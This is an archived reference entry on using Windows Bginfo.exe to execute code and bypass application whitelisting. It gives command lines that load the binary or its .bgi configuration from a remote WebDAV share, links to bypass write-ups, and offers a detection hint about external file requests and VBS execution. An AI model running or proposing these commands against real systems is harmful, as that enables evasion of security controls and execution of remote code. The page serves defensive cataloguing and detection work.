# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
New site: https://github.com/LOLBAS-Project/LOLBAS
Web portal: https://lolbas-project.github.io/ 
## Bginfo.exe

* Functions: Execute

```
bginfo.exe bginfo.bgi /popup /nolicprompt    

"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt    

"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt   
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe

Code sample:
* https://github.com/api0cradle/BGInfo/blob/master/BGITool_1.0.ps1

Resources: 
* https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/   
* https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/  
* https://twitter.com/Oddvarmoe/status/865330067630694400   
* https://twitter.com/ItsReallyNick/status/996133093613424641   
* https://github.com/3gstudent/bgi-creater   
* https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/  

Full path:
```
No fixed path
```

Notes:
Used to set background image in Windows with details about the environment


Detection:
Bginfo.exe requesting files externally or running VBS scripts.
